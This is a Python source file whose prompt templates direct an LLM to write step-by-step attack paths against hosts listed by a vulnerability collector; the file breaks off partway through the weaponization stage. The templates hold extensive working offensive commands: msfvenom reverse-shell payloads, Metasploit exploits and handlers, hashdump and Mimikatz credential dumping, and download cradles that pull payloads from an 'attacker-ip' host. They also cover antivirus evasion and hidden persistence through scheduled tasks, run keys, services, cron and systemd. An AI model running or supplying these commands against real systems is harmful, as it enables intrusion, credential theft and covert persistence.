"""
Prompt building logic for LLM interactions.
Centralizes all prompt templates and construction for attack path generation.
"""
from app.models.attack_context import AttackContext
from app.models.host import InputHost


class PromptBuilder:
    """Builds dynamic prompts for attack path generation based on available data."""
    
    SYSTEM_MESSAGE = (
        "You are a MITRE ATT&CK and Cyber Kill Chain expert specializing in offensive security. "
        "Your role is to generate realistic, step-by-step attack sequences based on vulnerability "
        "and exposure data provided by external collectors. Structure attack paths following the "
        "Cyber Kill Chain phases and map each action to relevant MITRE ATT&CK techniques. "
        "Provide detailed technical descriptions and include code examples when applicable. "
        "Tailor your attack path based on the specific context provided - consider security controls, "
        "network segmentation, identity management, and all available asset details.\n\n"
        
        "CRITICAL - MANDATORY DETAIL LEVEL:\n"
        "Your responses MUST match the detail level shown in this reference example:\n\n"
        
        "=== REFERENCE EXAMPLE: IIS 6.0 WebDAV Exploitation (Granny Box) ===\n\n"
        
        "**Phase 1: Initial Access**\n"
        "Generate payload:\n"
        "```bash\n"
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=1337 -f aspx\n"
        "```\n\n"
        
        "Configure handler:\n"
        "```bash\n"
        "use exploit/multi/handler\n"
        "set LHOST 10.10.14.4   # Often set twice due to a 'weird bug'\n"
        "set LPORT 1337\n"
        "set PAYLOAD windows/meterpreter/reverse_tcp\n"
        "run   # or exploit\n"
        "```\n\n"
        
        "**Phase 2: Privilege Escalation**\n"
        "Verify privileges and migrate:\n"
        "```bash\n"
        "getuid   # Check current user (e.g., NT AUTHORITY\\\\NETWORK SERVICE)\n"
        "ps   # List processes\n"
        "migrate 1848   # Migrate to stable svchost process\n"
        "```\n\n"
        
        "Use local exploit suggester:\n"
        "```bash\n"
        "background   # Background the Meterpreter shell\n"
        "use exploit/post/windows/gather/local_exploit_suggester\n"
        "set session 1   # Set to current session ID\n"
        "run\n"
        "```\n\n"
        
        "Execute privilege escalation:\n"
        "```bash\n"
        "use exploit/windows/local/ms14_070_tcpip_ioctl\n"
        "set session 3   # Set to current session ID\n"
        "run\n"
        "getuid   # Verify: NT AUTHORITY\\\\SYSTEM\n"
        "```\n\n"
        
        "**Phase 3: Pivoting (if multiple hosts)**\n"
        "Configure routing:\n"
        "```bash\n"
        "route add 10.10.10.14 255.255.255.255 3   # Route through session 3\n"
        "```\n\n"
        
        "Enumerate through pivot:\n"
        "```bash\n"
        "use auxiliary/scanner/portscan/tcp\n"
        "set RHOSTS 10.10.10.14\n"
        "set ports 80\n"
        "run\n"
        "```\n\n"
        
        "Exploit through pivot:\n"
        "```bash\n"
        "use exploit/windows/iis/ms17_017_iis6_webdav_scstoragepath\n"
        "set RHOST 10.10.10.14   # Internal target\n"
        "set LHOST 10.10.10.15   # CRITICAL: Pivot host IP (NOT attacker IP)\n"
        "run\n"
        "```\n\n"
        
        "**Phase 4: Post-Exploitation**\n"
        "Dump credentials:\n"
        "```bash\n"
        "hashdump   # Dump user hashes\n"
        "```\n\n"
        
        "Port forwarding:\n"
        "```bash\n"
        "portfwd add -L 445 -R 445 -r 10.10.10.14\n"
        "```\n\n"
        
        "=== END REFERENCE EXAMPLE ===\n\n"
        
        "STRICT REQUIREMENTS FOR ALL RESPONSES:\n"
        "1. Include ACTUAL command syntax (not descriptions)\n"
        "2. Show session management (sessions -l, sessions -i, background)\n"
        "3. Include verification steps (getuid, sysinfo) after major actions\n"
        "4. Use example values (session IDs, IPs, ports) in commands\n"
        "5. Show process migration when relevant\n"
        "6. Include local_exploit_suggester for privilege escalation\n"
        "7. Format commands in code blocks with bash syntax\n"
        "8. Add inline comments explaining parameters\n"
        "9. For Metasploit: show 'use', 'set', 'run' sequence exactly\n"
        "10. Include troubleshooting notes (e.g., 'set LHOST twice due to bug')\n"
    )
    
    @staticmethod
    def _format_list(items: list | None, default: str = "None detected") -> str:
        """Format a list for display, handling None and empty lists."""
        if not items:
            return default
        return '\n  • ' + '\n  • '.join(str(item) for item in items)
    
    @staticmethod
    def _format_value(value, default: str = "Not specified") -> str:
        """Format a single value for display."""
        if value is None:
            return default
        if isinstance(value, bool):
            return "Yes" if value else "No"
        return str(value)
    
    @staticmethod
    def build_attack_analysis_prompt(host: InputHost) -> str:
        """
        Build a dynamic prompt for attack path generation.
        
        Intelligently constructs the prompt based on available data fields.
        Only includes sections where data is provided, making the prompt
        concise and relevant to the specific host context.
        
        Args:
            host: Input host data from external collector
            
        Returns:
            Formatted prompt string for LLM to generate attack sequence
        """
        pb = PromptBuilder  # Alias for shorter calls
        
        # Build sections dynamically based on available data
        sections = []
        
        # ==================== CORE SYSTEM INFO ====================
        if host.Os:
            core_info = [f"- Operating System: {host.Os}"]
            sections.append("=== CORE SYSTEM INFO ===\n" + "\n".join(core_info))
        
        # ==================== ASSET IDENTIFICATION ====================
        asset_info = []
        if host.Hostname:
            asset_info.append(f"- Hostname: {host.Hostname}")
        if host.IpAddress:
            asset_info.append(f"- IP Address: {host.IpAddress}")
        if host.MacAddress:
            asset_info.append(f"- MAC Address: {host.MacAddress}")
        if host.LastSeen:
            asset_info.append(f"- Last Seen: {host.LastSeen}")
        
        if asset_info:
            sections.append("=== ASSET IDENTIFICATION ===\n" + "\n".join(asset_info))
        
        # ==================== NETWORK & EXPOSURE ====================
        network_info = []
        if host.Services:
            # Extract ports and service info from Services array
            ports = [str(svc.Port) for svc in host.Services if svc.Port]
            if ports:
                network_info.append(f"- Open Ports: {', '.join(ports)}")
            
            # Format service details
            service_details = []
            for svc in host.Services:
                svc_str = f"Port {svc.Port}: {svc.ServiceName or 'unknown'}"
                if svc.Product:
                    svc_str += f" ({svc.Product}"
                    if svc.Version:
                        svc_str += f" {svc.Version}"
                    svc_str += ")"
                service_details.append(svc_str)
            if service_details:
                network_info.append(f"- Services:{pb._format_list(service_details)}")
        
        if network_info:
            sections.append("=== NETWORK & EXPOSURE ===\n" + "\n".join(network_info))
        
        # ==================== VULNERABILITIES =====================
        vuln_info = []
        if host.Services:
            # Extract vulnerabilities from all services
            all_vulns = []
            for svc in host.Services:
                if svc.Vulnerabilities:
                    for vuln in svc.Vulnerabilities:
                        if vuln.info:
                            vuln_desc = f"{vuln.template_id or 'Unknown CVE'}"
                            if vuln.info.name:
                                vuln_desc += f": {vuln.info.name}"
                            if vuln.info.classification and vuln.info.classification.cvss_score:
                                vuln_desc += f" (CVSS: {vuln.info.classification.cvss_score})"
                            vuln_desc += f" on port {svc.Port}"
                            all_vulns.append(vuln_desc)
            
            if all_vulns:
                vuln_info.append(f"- Detected Vulnerabilities:{pb._format_list(all_vulns)}")
        
        if vuln_info:
            sections.append("=== VULNERABILITIES ===\n" + "\n".join(vuln_info))

        
        # Build the complete prompt
        target_info = "\n\n".join(sections) if sections else "Minimal information available - generate generic attack path"
        
        prompt = f"""Generate a realistic attack path for the following target based on collected vulnerability and exposure data.

TARGET INFORMATION (from external collector):

{target_info}

⚠️  CRITICAL - MANDATORY FORMAT REQUIREMENTS:

You MUST follow the exact format shown in the system message reference example (Granny IIS 6.0 exploitation).

For Metasploit procedures, use this EXACT structure:

**Handler Setup**:
```bash
use exploit/multi/handler
set LHOST <attacker_ip>   # Set twice due to known Metasploit bug
set LHOST <attacker_ip>
set LPORT <port>
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

**Session Management** (ALWAYS include after exploitation):
```bash
sessions -l   # List all active sessions
sessions -i 1   # Interact with session 1
getuid   # Verify current privileges
sysinfo   # Gather system information
```

**Privilege Escalation** (if initial access is not SYSTEM):
```bash
background   # Background current session
use exploit/post/windows/gather/local_exploit_suggester
set session 1
run
# Then use suggested exploit:
use exploit/windows/local/ms14_070_tcpip_ioctl
set session 1
run
sessions -i 2   # Interact with new elevated session
getuid   # Should show NT AUTHORITY\\SYSTEM
```

**Pivoting** (if lateral movement needed):
```bash
route add <target_subnet> <netmask> <session_id>
use auxiliary/scanner/portscan/tcp
set RHOSTS <internal_target>
run
# Exploit through pivot:
use exploit/<path>
set RHOST <internal_target>
set LHOST <pivot_host_ip>   # CRITICAL: Use pivot IP, NOT attacker IP
run
```

**Post-Exploitation** (ALWAYS include):
```bash
hashdump   # Dump password hashes
portfwd add -L <local_port> -R <remote_port> -r <target>
download <file>
upload <file> <destination>
```

YOUR TASK:
1. Generate a detailed, step-by-step attack path following the Cyber Kill Chain phases
2. Map each action to relevant MITRE ATT&CK techniques (TTP - Tactics, Techniques, and Procedures)
3. **CRITICAL**: Tailor the attack path to the SPECIFIC CONTEXT provided above:
   - If security controls (EDR, firewall) are present, include evasion techniques
   - If cloud/container environments are detected, include cloud-native attack techniques
   - If misconfigurations are listed, exploit them specifically
   - If admin accounts are identified, target them for privilege escalation
   - If MFA is disabled, note easier credential access
   - If asset criticality is high, emphasize the business impact
   - Consider network segmentation for lateral movement strategies
4. Provide technical details and include code examples when applicable
5. Assess the overall risk level based on exploitability, impact, AND asset criticality

Attack Path Structure - Follow Cyber Kill Chain Phases:

1. **Reconnaissance**: Collect public and observable information about the target to identify assets, services, and potential exposure (passive, non-actionable). Map to MITRE techniques like T1595 (Active Scanning), T1592 (Gather Victim Host Information).

2. **Weaponization**: Design or select a capability or payload tailored to observed weaknesses. **Create actual malicious artifacts** (executables, scripts, documents) using tools like:
   - msfvenom for Windows/Linux payloads (e.g., 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o payload.exe')
   - PowerShell Empire for PowerShell-based payloads
   - Custom exploit code compilation
   - Malicious document generation (maldocs)
   
   **Include specific commands showing artifact creation** and **name the files** (e.g., "backdoor.exe", "update.ps1") so they can be referenced in later stages (Installation, Persistence). Map to MITRE techniques like T1587.001 (Develop Capabilities: Malware), T1588.001 (Obtain Capabilities: Malware).

3. **Delivery**: Describe the vector used to deliver the capability to the target. **Include detailed step-by-step procedures** when using Metasploit or similar exploitation frameworks.

   **Example: Metasploit Exploitation Framework - Complete Procedure**:
   
   **Step 1 - Generate payload (if not already created in Weaponization)**:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=1337 -f aspx > shell.aspx
   ```
   
   **Step 2 - Start msfconsole and configure handler**:
   ```bash
   use exploit/multi/handler
   set LHOST 10.10.14.4   # Attacker's IP (sometimes set twice due to known bug)
   set LHOST 10.10.14.4
   set LPORT 1337
   set PAYLOAD windows/meterpreter/reverse_tcp
   run   # or 'exploit' - starts listener
   ```
   
   **Step 3 - For direct exploitation (if applicable to vulnerability)**:
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue   # Example exploit module
   show options   # Display all configurable parameters
   set RHOST 10.10.10.15   # Target IP address
   set LHOST 10.10.14.4    # Attacker listening IP
   set LPORT 4444          # Callback port
   set PAYLOAD windows/meterpreter/reverse_tcp
   check   # Verify target is vulnerable before exploit (optional but recommended)
   run     # Execute the attack
   ```
   
   **Step 4 - Verify session establishment**:
   ```bash
   sessions -l   # List all active sessions
   sessions -i 1   # Interact with session 1
   getuid   # Verify current user privileges
   sysinfo   # Gather system information
   ```
   
   **Step 5 - Session management (if needed)**:
   ```bash
   background   # Background the current session (returns to msfconsole)
   sessions -i 2   # Switch to different session
   migrate 1848   # Migrate to more stable process (if current process unstable)
   ```
   
   **Alternative Delivery Methods** (non-Metasploit):
   - **WebDAV exploitation** (IIS 6.0): Use Burp Suite or HTTP commands to PUT payload, then MOVE to rename to executable extension (.aspx)
   - **File-based delivery**: SMB shares, FTP, HTTP downloads, malicious email attachments
   - **Phishing**: Malicious Office documents, shortened URLs with payload, social engineering
   - **Watering hole**: Compromise legitimate websites, inject payload in web pages
   - **Supply chain**: Compromise software repositories, update servers
   
   **Important Considerations**:
   - **Network connectivity**: Ensure attacker can receive reverse callback on LHOST:LPORT
   - **Firewall rules**: Verify outbound traffic on selected port is allowed from target
   - **Encoding**: Use payload encoding to evade antivirus (e.g., 'msfvenom -e x86/shikata_ga_nai')
   - **Staged vs stageless**: Staged payloads (windows/meterpreter/reverse_tcp) reduce initial footprint; stageless (windows/meterpreter_reverse_tcp) are more stable
   - **Session migration**: If initial process dies or is unstable, migrate to more stable process like svchost.exe
   
   Map to MITRE techniques: T1566 (Phishing), T1190 (Exploit Public-Facing Application), T1566.002 (Phishing: Spearphishing Link).

4. **Exploitation**: Trigger vulnerability or misconfiguration to gain initial access. Include specific exploitation techniques, CVE details, and code examples.
   
   **Post-Initial Access - Privilege Verification and Escalation**:
   
   Once session is established, verify privileges and escalate if needed:
   
   **Step 1 - Verify current privileges**:
   ```bash
   getuid   # Check current user identity (e.g., "NT AUTHORITY\\NETWORK SERVICE" or "NT AUTHORITY\\SYSTEM")
   ```
   
   **Step 2 - Migrate to stable process (if needed)**:
   ```bash
   ps   # List running processes
   migrate 1848   # Migrate to stable process like svchost.exe
   ```
   
   **Step 3 - Use Local Exploit Suggester**:
   ```bash
   background   # Background the Meterpreter shell
   use post/multi/recon/local_exploit_suggester   # Or: exploit/post/windows/gather/local_exploit_suggester
   set session 1   # Set to current session ID
   run   # Recommends local exploits based on OS and patches
   ```
   
   **Step 4 - Execute privilege escalation exploit**:
   ```bash
   use exploit/windows/local/ms14_070_tcpip_ioctl   # Example: MS14-070 for Windows
   set session 1   # Set to current session ID
   set LHOST 10.10.14.4   # Callback IP
   set LPORT 4445   # Different port than original
   run   # Execute exploit to obtain SYSTEM privileges
   ```
   
   **Step 5 - Verify elevated privileges**:
   ```bash
   sessions -i 2   # Interact with new elevated session
   getuid   # Should now show "NT AUTHORITY\\SYSTEM"
   ```
   
   Map to MITRE Initial Access techniques (T1190, T1203) and Privilege Escalation techniques (T1068, T1055, T1134).

5. **Installation**: Establish persistent foothold by deploying tools, backdoors, or mechanisms **created during Weaponization**. **Reference the specific artifacts by name** (e.g., "Upload payload.exe created in Weaponization stage"). 
   
   **CRITICAL - Show DETAILED file transfer/upload process**:
   - **Meterpreter sessions**: Use 'upload' command with full paths:
     • 'upload /path/to/payload.exe C:\\Windows\\Temp\\payload.exe'
     • 'upload backdoor.exe C:\\Users\\Public\\update.exe'
   - **SMB/CIFS**: Mount shares and copy files:
     • 'smbclient //target/C$ -U user%pass -c "put payload.exe Windows\\Temp\\payload.exe"'
     • 'net use \\\\target\\C$ /user:domain\\user password && copy payload.exe \\\\target\\C$\\Windows\\Temp\\'
   - **PowerShell remoting**: Transfer via Base64 or download cradles:
     • 'powershell -c "IEX(New-Object Net.WebClient).DownloadFile(\'http://attacker-ip/payload.exe\',\'C:\\Temp\\payload.exe\')"'
     • 'certutil -urlcache -split -f http://attacker-ip/payload.exe C:\\Temp\\payload.exe'
   - **Linux targets**: Use scp, wget, curl, or netcat:
     • 'scp payload.elf user@target:/tmp/update'
     • 'wget http://attacker-ip/payload.elf -O /tmp/.hidden'
     • 'curl http://attacker-ip/payload.elf -o /var/tmp/systemd'
   
   **Then show persistence setup (IMPORTANT - use correct syntax for Windows cmd.exe)**:
   - **Scheduled tasks (Windows cmd.exe)**: 'schtasks /create /tn WindowsUpdate /tr C:\\Temp\\payload.exe /sc onlogon /ru SYSTEM'
   - **Scheduled tasks (from Meterpreter)**: 'execute -f cmd.exe -a "/c schtasks /create /tn WindowsUpdate /tr C:\\\\Temp\\\\payload.exe /sc onlogon /ru SYSTEM"'
   - **Registry run keys (SIMPLER alternative)**: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d C:\\Temp\\payload.exe'
   - **Services**: 'sc create UpdateService binPath= C:\\Temp\\payload.exe start= auto && sc start UpdateService'
   - **Cron jobs (Linux)**: 'echo "@reboot /tmp/.hidden" | crontab -'
   - **systemd service (Linux)**: 'echo "[Unit]\\\\nDescription=Update Service\\\\n[Service]\\\\nExecStart=/tmp/.hidden\\\\n[Install]\\\\nWantedBy=multi-user.target" > /etc/systemd/system/update.service && systemctl enable update.service'
   
   **File placement considerations**:
   - User-writable locations: C:\\Users\\Public, C:\\ProgramData, C:\\Windows\\Temp, /tmp, /var/tmp
   - Hidden locations: AppData\\Roaming, /home/user/.config, /var/lib
   - Legitimate-looking paths: C:\\Windows\\System32\\wbem, C:\\Program Files\\Common Files
   
   **CRITICAL SYNTAX RULES - Scheduled Tasks in Windows cmd.exe**:
   - Task name and executable path should NOT have quotes when using cmd.exe
   - Correct syntax: 'schtasks /create /tn WindowsUpdate /tr C:\\Temp\\payload.exe /sc onlogon /ru SYSTEM'
   - If path has spaces, use 8.3 short names (e.g., C:\\PROGRA~1) or place file in no-space directory
   - Alternative: Use registry run keys (simpler, no quote/syntax issues)
   
   Map to MITRE techniques: T1105 (Ingress Tool Transfer), T1053 (Scheduled Task/Job), T1543 (Create or Modify System Process), T1547 (Boot or Logon Autostart Execution).

6. **Command and Control (C2)**: Define the channel for remote control and coordination. Include protocols, tools (e.g., Metasploit, Cobalt Strike, custom C2), and communication methods.
   
   **Advanced C2 - Pivoting and Lateral Movement**:
   
   If lateral movement to additional systems is needed, use Metasploit's pivoting capabilities:
   
   **Method 1: Metasploit Routing (Direct Pivoting)**:
   ```bash
   # Configure route to internal network through compromised host
   route add 10.10.10.14 255.255.255.255 1   # Route traffic to 10.10.10.14 through session 1
   route print   # Verify route is active
   
   # Test connectivity through pivot
   use auxiliary/scanner/portscan/tcp
   set RHOSTS 10.10.10.14   # Internal target IP
   set PORTS 80,445,3389   # Ports to scan
   run   # Scan through the pivot
   
   # Exploit through the pivot
   use exploit/windows/iis/ms17_017_iis6_webdav_scstoragepath   # Example: CVE-2017-7269
   set RHOST 10.10.10.14   # Internal target IP
   set LHOST 10.10.10.15   # CRITICAL: IP of pivot host (NOT attacker IP)
   set LPORT 4444
   run   # Exploit will callback to pivot host, Metasploit forwards session
   ```
   
   **Method 2: SOCKS Proxy (For External Tools)**:
   ```bash
   # Start SOCKS proxy server in Metasploit
   use auxiliary/server/socks_proxy   # Or: auxiliary/server/socks4a
   set SRVHOST 127.0.0.1
   set SRVPORT 1080
   run -j   # Run in background
   
   # Configure route for proxy
   route add 10.10.10.0 255.255.255.0 1   # Route entire subnet through session 1
   
   # Use external tools through proxy (via proxychains)
   proxychains nmap -sT -Pn 10.10.10.14 -p 80,445,3389
   proxychains curl http://10.10.10.14
   ```
   
   **Method 3: Port Forwarding (Access Internal Services)**:
   ```bash
   # From within Meterpreter session
   portfwd add -l 445 -p 445 -r 10.10.10.14   # Forward local port 445 to remote port 445
   portfwd add -l 8080 -p 80 -r 10.10.10.14   # Forward local 8080 to remote 80
   portfwd list   # Show all active port forwards
   
   # Access forwarded service from attacker machine
   smbclient -L 127.0.0.1 -U Administrator   # Access SMB through tunnel
   curl http://127.0.0.1:8080   # Access web service through tunnel
   
   # Note: Full syntax for portfwd
   portfwd add -L [LOCAL_PORT] -R [REMOTE_PORT] -r [REMOTE_HOST]
   ```
   
   Map to MITRE C2 techniques like T1071 (Application Layer Protocol), T1573 (Encrypted Channel), T1090 (Proxy), T1021 (Remote Services).

7. **Actions on Objectives**: Describe goals achieved after establishing control such as data access, lateral movement, privilege escalation, data exfiltration, or system disruption.
   
   **Post-Exploitation Actions**:
   
   **Credential Harvesting**:
   ```bash
   # From Meterpreter with SYSTEM privileges
   hashdump   # Dump local user hashes (LM and NTLM)
   
   # Output example:
   # Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
   # Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
   
   # Load additional credential modules
   load kiwi   # Load Mimikatz
   creds_all   # Dump all credentials from memory
   ```
   
   **System Reconnaissance**:
   ```bash
   # Enumerate system
   sysinfo   # OS version, architecture, computer name
   ipconfig   # Network configuration
   route   # Routing table
   
   # Process enumeration
   ps   # List running processes
   
   # Network enumeration
   netstat   # Active connections
   arp   # ARP table
   ```
   
   **File System Access**:
   ```bash
   # Navigate file system
   pwd   # Current directory
   ls   # List files
   cd C:\\Users\\Administrator\\Desktop   # Change directory
   download flag.txt   # Download file to attacker machine
   upload exploit.exe C:\\Temp\\   # Upload file to target
   ```
   
   **Lateral Movement Preparation**:
   ```bash
   # Enumerate domain/network
   run post/windows/gather/enum_domain   # Enumerate domain information
   run post/windows/gather/enum_shares   # Enumerate network shares
   run post/windows/gather/enum_logged_on_users   # Find logged-on users
   ```
   
   Map to MITRE techniques like T1003 (Credential Dumping), T1021 (Remote Services), T1567 (Exfiltration Over Web Service), T1083 (File and Directory Discovery).

⚠️  RESPONSE FORMAT ENFORCEMENT - FOLLOW THESE RULES EXACTLY:

1. **Include ACTUAL commands** - Not descriptions like "run msfconsole", but actual command sequences:
   ✅ CORRECT: "use exploit/multi/handler\\nset LHOST 10.10.14.4\\nrun"
   ❌ WRONG: "Configure a handler in Metasploit"

2. **Show session management** - ALWAYS include after exploitation:
   ✅ "sessions -l   # List sessions\\nsessions -i 1   # Interact\\ngetuid   # Verify privileges"

3. **Include verification steps** - After each major action:
   ✅ "getuid   # Check current user\\nsysinfo   # System details"

4. **Use example values** - Provide concrete IPs, ports, session IDs:
   ✅ "set LHOST 10.10.14.4" not "set LHOST <attacker-ip>"
   ✅ "sessions -i 1" not "sessions -i <id>"
   ✅ "migrate 1848" not "migrate <pid>"

5. **Process migration** - Include when privilege escalation needed:
   ✅ "ps\\nmigrate 1848   # Migrate to svchost"

6. **Local exploit suggester** - Use for privilege escalation discovery:
   ✅ "background\\nuse exploit/post/windows/gather/local_exploit_suggester\\nset session 1\\nrun"

7. **Privilege escalation flow** - Show complete sequence:
   ✅ "use exploit/windows/local/ms14_070_tcpip_ioctl\\nset session 1\\nrun\\nsessions -i 2\\ngetuid"

8. **Pivoting syntax** - Include subnet masks and session IDs:
   ✅ "route add 10.10.10.14 255.255.255.255 1"
   ✅ "set LHOST 10.10.10.15   # Pivot host IP, NOT attacker IP"

9. **Post-exploitation** - ALWAYS include hashdump, file access, or lateral movement:
   ✅ "hashdump\\ndownload C:\\\\Users\\\\Admin\\\\Desktop\\\\flag.txt"

10. **Code blocks** - Format all commands in bash code blocks with comments:
    ✅ "```bash\\nuse exploit/multi/handler   # Start handler\\nset LHOST 10.10.14.4\\n```"

Guidelines:
- Each step must be a single, detailed string describing one concrete attacker action
- Include technical specifics: commands, tools, protocols, file paths when relevant
- Add code examples for exploitation and post-exploitation phases
- Map each phase to specific MITRE ATT&CK technique IDs (T####)
- Number of steps should reflect a realistic progression for the given vulnerabilities
- Ensure logical flow from reconnaissance through objectives
- Be realistic about what an attacker could achieve with the given attack surface

Format your response as JSON with this exact structure:
{{
    "attack_path": [
        "Reconnaissance: [Detailed description with SPECIFIC context from target info, MITRE mapping]",
        "Weaponization: [Description considering security controls present, MITRE mapping]",
        "Delivery: [Description considering network exposure and segmentation, MITRE mapping]",
        "Exploitation: [Detailed exploitation of SPECIFIC vulnerabilities/misconfigurations listed, with CVE, commands, code examples, MITRE mapping]",
        "Installation: [Persistence mechanism considering EDR/security controls, MITRE mapping]",
        "Command and Control: [C2 setup considering firewall rules and network monitoring, MITRE mapping]",
        "Actions on Objectives: [Goals considering asset criticality and data classification, MITRE mapping]"
    ]
}}

Rules:
- Always return a valid JSON object with key "attack_path"
- Each attack_path element must be a single string describing one Cyber Kill Chain phase
- Always map actions to equivalent MITRE ATT&CK technique IDs (T####)
- **REFERENCE SPECIFIC CONTEXT**: Use actual details from the target information (e.g., specific CVEs, account names, software versions, misconfigurations)
- Include code examples, commands, or technical details when describing exploitation
- Ensure output is valid, parseable JSON with no additional text outside the JSON structure

Generate a realistic, context-aware attack sequence now."""
        
        return prompt
    
    # =========================================================================
    # STAGE-LEVEL PROMPTING WITH CONTINUITY PRESERVATION
    # =========================================================================
    
    @staticmethod
    def build_reconnaissance_prompt(host: InputHost) -> str:
        """
        Stage 1: Reconnaissance - COLLECTOR DATA ANALYSIS ONLY.
        
        Stage 1 is NOT active reconnaissance and does NOT plan attacks.
        All data comes from external collectors, AD, scanners, and audit tools.
        This stage ONLY ANALYZES the collected data - no procedures, no attacks,
        no strategies. That comes in Stages 2-7.
        """
        pb = PromptBuilder
        
        sections = []
        
        # Collector data received
        collector_summary = []
        if host.Os:
            collector_summary.append(f"Operating System: {host.Os}")
        if host.Services:
            collector_summary.append(f"Services Running: {len(host.Services)} detected")
            # Count vulnerabilities
            total_vulns = sum(len(svc.Vulnerabilities) if svc.Vulnerabilities else 0 for svc in host.Services)
            if total_vulns > 0:
                collector_summary.append(f"Vulnerabilities Found: {total_vulns}")
        
        if collector_summary:
            sections.append("COLLECTOR DATA SUMMARY:\n" + "\n".join(collector_summary))
        
        # Actual findings from collector
        findings = []
        if host.Os:
            findings.append(f"1. Operating System: {host.Os}")
        if host.IpAddress:
            findings.append(f"2. IP Address: {host.IpAddress}")
        if host.Hostname:
            findings.append(f"3. Hostname: {host.Hostname}")
        if host.Services:
            ports = [str(svc.Port) for svc in host.Services if svc.Port]
            findings.append(f"4. Open Ports: {', '.join(ports)}")
            service_details = []
            for svc in host.Services:
                svc_desc = f"Port {svc.Port}: {svc.ServiceName or 'unknown'}"
                if svc.Product:
                    svc_desc += f" - {svc.Product}"
                    if svc.Version:
                        svc_desc += f" {svc.Version}"
                service_details.append(svc_desc)
            findings.append(f"5. Services: {pb._format_list(service_details)}")
            # Add vulnerabilities
            all_vulns = []
            for svc in host.Services:
                if svc.Vulnerabilities:
                    for vuln in svc.Vulnerabilities:
                        if vuln.template_id:
                            vuln_desc = f"{vuln.template_id}"
                            if vuln.info and vuln.info.name:
                                vuln_desc += f": {vuln.info.name}"
                            all_vulns.append(vuln_desc)
            if all_vulns:
                findings.append(f"6. Known Vulnerabilities: {pb._format_list(all_vulns)}")
        
        if findings:
            sections.append("COLLECTOR FINDINGS:\n" + "\n".join(findings))
        
        target_info = "\n\n".join(sections) if sections else "No collector data provided"
        
        return f"""STAGE 1: RECONNAISSANCE - COLLECTOR DATA ANALYSIS

⚠️  CRITICAL: This stage ONLY ANALYZES collector data.
NO active scanning. NO procedures. NO attack strategies.
Stages 2-7 will handle planning based on this analysis.

COLLECTOR DATA RECEIVED:
{target_info}

YOUR TASK - ANALYSIS ONLY (Do NOT plan attacks):

1. Summarize what the collector found
   - What platform?
   - What OS version?
   - What services are running?
   - What vulnerabilities were detected?
   - What security controls are in place?

2. Categorize the findings
   - Vulnerabilities by type (access control, RCE, credential access, etc.)
   - Services by risk level (critical, high, medium, low)
   - Security controls that are present

3. Map to MITRE reconnaissance techniques (information gathering only)
   - T1595: Active Scanning (if collector did active scanning)
   - T1592: Gather Victim Host Information
   - T1598: Phishing for Information (if applicable)

4. Document data quality
   - How complete is the data?
   - What gaps exist?
   - What can we conclude from this data?

CRITICAL RULES - DO NOT VIOLATE:
❌ DO NOT plan attack methods
❌ DO NOT suggest attack techniques
❌ DO NOT list tools to use for attacking
❌ DO NOT suggest evasion approaches
❌ DO NOT describe ways to compromise findings
❌ DO NOT suggest access escalation paths
❌ DO NOT suggest movement within network

✅ DO ONLY:
✓ Summarize what was found
✓ Categorize findings by type
✓ Note the platform and OS
✓ List vulnerabilities as reported by collector
✓ List services as reported by collector
✓ List security controls as reported by collector
✓ Map to reconnaissance MITRE techniques
✓ End with: "This analysis will inform attack planning in subsequent stages"

Output Format:
- Start with 1-2 sentence summary of collector findings
- List all key findings from the data
- Categorize by type (vulnerabilities, services, controls, assets)
- Map to MITRE T#### techniques (reconnaissance phase only)
- End with acknowledgment that analysis is complete

REMEMBER:
- Stage 1 = Analysis of what was collected
- Stages 2-7 = Attack planning and execution
- Your job = Report findings, not plan actions"""
    
    @staticmethod
    def build_weaponization_prompt(host: InputHost, context: AttackContext) -> str:
        """
        Stage 2: Weaponization - PLATFORM-SPECIFIC PAYLOAD CREATION.
        
        Creates payloads appropriate for the ACTUAL target platform
        using the ACTUAL vulnerabilities found in Stage 1.
        NOT hardcoded for any specific scenario.
        """
        pb = PromptBuilder
        
        platform = host.Os or "UNKNOWN"
        sections = []
        
        # Target platform
        sections.append(f"TARGET PLATFORM: {platform}")
        
        # What recon found
        if context.reconnaissance:
            sections.append(f"RECONNAISSANCE FINDINGS:\n{context.reconnaissance[:500]}")
        else:
            sections.append("RECONNAISSANCE: No specific findings - create generic payload")
        
        # Services and vulnerabilities
        services_info = []
        if host.Services:
            service_list = []
            vuln_list = []
            for svc in host.Services:
                svc_desc = f"Port {svc.Port}: {svc.ServiceName or 'unknown'}"
                if svc.Product:
                    svc_desc += f" ({svc.Product}"
                    if svc.Version:
                        svc_desc += f" {svc.Version}"
                    svc_desc += ")"
                service_list.append(svc_desc)
                
                if svc.Vulnerabilities:
                    for vuln in svc.Vulnerabilities:
                        if vuln.template_id:
                            vuln_desc = f"{vuln.template_id}"
                            if vuln.info and vuln.info.name:
                                vuln_desc += f": {vuln.info.name}"
                            vuln_list.append(vuln_desc)
            
            if service_list:
                services_info.append(f"- Services: {pb._format_list(service_list)}")
            if vuln_list:
                services_info.append(f"- Vulnerabilities: {pb._format_list(vuln_list)}")
        if services_info:
            sections.append("TARGET ATTACK SURFACE:\n" + "\n".join(services_info))
        
        target_info = "\n\n".join(sections)
        
        # Platform-specific payload guidance
        platform_guidance = {
            "windows": "Create .exe, .ps1, or .bat payload. Use Windows-specific tools like msfvenom or PowerShell.",
            "linux": "Create .sh or ELF binary payload. Use bash/python for shell scripts or gcc for compiled binaries.",
            "macos": "Create .sh, .app, or Mach-O binary payload. Leverage macOS-specific execution contexts.",
        }
        
        platform_lower = platform.lower()
        guidance = "Create payload for UNKNOWN platform - analyze actual target characteristics."
        for key, val in platform_guidance.items():
            if key in platform_lower:
                guidance = val
                break
        
        return f"""STAGE 2: WEAPONIZATION - CREATE PAYLOAD FOR {platform.upper()}

{target_info}

PAYLOAD CREATION GUIDANCE:
{guidance}

YOUR TASK - CREATE PLATFORM-APPROPRIATE PAYLOAD:
